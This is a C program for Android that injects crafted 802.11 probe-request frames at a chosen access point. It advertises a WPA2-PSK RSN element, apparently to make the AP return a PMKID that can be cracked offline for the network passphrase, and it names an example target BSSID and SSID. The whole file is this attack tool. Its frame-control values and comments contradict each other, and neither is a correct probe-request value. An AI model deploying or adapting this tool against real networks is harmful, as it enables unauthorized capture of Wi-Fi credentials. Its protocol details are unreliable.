/* probe: inject 802.11 probe-request frames on a monitor-mode interface (Android).
 *
 * Usage: probe <iface> <ap_mac> <da_mac> <ssid> [count] [interval_ms]
 *   ap_mac : BSSID of the target AP ("bc:3e:07:01:dc:98")
 *   da_mac : destination (AP mac for directed, or "ffffffffffff" for broadcast)
 *   ssid   : SSID string, e.g. "32H10F"
 *   count  : frames (default 20)
 *   interval_ms (default 100)
 *
 * Frame (no radiotap): FC(2) DA(6) SA(6) BSSID(6) seq(2) [SSID IE][rates IE][RSN IE]
 * FC = 0x00b0 (mgmt, subtype=11 probe request). SA = this host's MAC (from ioctl).
 * The RSN IE advertises WPA2-PSK so the AP treats us as an RSN client; on many APs
 * the resulting probe response may carry a PMKID for the AP's PMKSA cache.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#ifndef ETH_P_802_11
#define ETH_P_802_11 0x800b
#endif

static unsigned char hexval(char c) {
    if (c >= '0' && c <= '9') return (unsigned char)(c - '0');
    if (c >= 'a' && c <= 'f') return (unsigned char)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (unsigned char)(c - 'A' + 10);
    return 0;
}
static int mac2bin(const char *s, unsigned char *o) {
    char h[13]; int k = 0;
    for (int i = 0; s[i] && k < 12; i++) {
        if (s[i] == ':' || s[i] == '-' || s[i] == ' ') continue;
        h[k++] = s[i];
    }
    h[k] = 0;
    if (k != 12) return -1;
    for (int i = 0; i < 6; i++)
        o[i] = (unsigned char)(hexval(h[2 * i]) * 16 + hexval(h[2 * i + 1]));
    return 6;
}
static void macstr(const unsigned char *m) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

int main(int argc, char **argv) {
    if (argc < 5) {
        fprintf(stderr, "usage: %s <iface> <ap_mac> <da_mac> <ssid> [count] [itv_ms]\n", argv[0]);
        return 2;
    }
    const char *iface = argv[1];
    const char *ssid  = argv[4];
    unsigned char ap[6], da[6], sa[6];
    if (mac2bin(argv[2], ap) != 6) { fprintf(stderr, "bad ap_mac\n"); return 2; }
    if (mac2bin(argv[3], da) != 6) { fprintf(stderr, "bad da_mac\n"); return 2; }
    int count = argc > 5 ? atoi(argv[5]) : 20;
    int itv   = argc > 6 ? atoi(argv[6]) : 100;

    /* read host MAC as SA */
    int cfd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr; memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(cfd, SIOCGIFHWADDR, &ifr) < 0) { perror("SIOCGIFHWADDR"); return 1; }
    memcpy(sa, ifr.ifr_hwaddr.sa_data, 6);
    close(cfd);

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_802_11));
    if (fd < 0) { perror("socket"); return 1; }
    struct ifreq ifr2; memset(&ifr2, 0, sizeof ifr2);
    strncpy(ifr2.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr2) < 0) { perror("SIOCGIFINDEX"); close(fd); return 1; }
    int ifindex = ifr2.ifr_ifindex;

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_802_11);
    sll.sll_ifindex = ifindex;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, da, 6);
    if (bind(fd, (struct sockaddr *)&sll, sizeof sll) < 0) { perror("bind"); close(fd); return 1; }

    unsigned char f[128]; int n = 0;
    f[n++] = 0x70; f[n++] = 0x00;                 /* FC: mgmt probe request (subtype 7) */
    memcpy(f + n, da, 6); n += 6;                 /* DA */
    memcpy(f + n, sa, 6); n += 6;                 /* SA */
    memcpy(f + n, ap, 6); n += 6;                 /* BSSID */
    f[n++] = 0x00; f[n++] = 0x00;                 /* seq */
    int slen = (int)strlen(ssid);
    if (slen > 32) slen = 32;
    f[n++] = 0x00; f[n++] = (unsigned char)slen;
    memcpy(f + n, ssid, slen); n += slen;         /* SSID IE */
    f[n++] = 0x02; f[n++] = 8;                     /* rates IE */
    unsigned char rates[8] = {0x83,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
    memcpy(f + n, rates, 8); n += 8;
    unsigned char rsn[22] = {0x30,0x14,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,
                             0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00};
    memcpy(f + n, rsn, 22); n += 22;              /* RSN IE (WPA2-PSK/CCMP) */

    printf("probe iface=%s ifindex=%d sa=", iface, ifindex); macstr(sa);
    printf(" bssid="); macstr(ap); printf(" da="); macstr(da);
    printf(" ssid='%s' count=%d itv=%dms len=%d\n", ssid, count, itv, n);

    struct timespec ts; ts.tv_sec = itv/1000; ts.tv_nsec = (long)(itv%1000)*1000000L;
    int sent = 0, fail = 0;
    for (int i = 0; i < count; i++) {
        ssize_t w = sendto(fd, f, n, 0, (struct sockaddr *)&sll, sizeof sll);
        if (w < 0) { fail++; if (fail < 3) perror("sendto"); }
        else sent++;
        if (i < count - 1) nanosleep(&ts, NULL);
    }
    printf("sent=%d fail=%d\n", sent, fail);
    close(fd);
    return fail == count ? 1 : 0;
}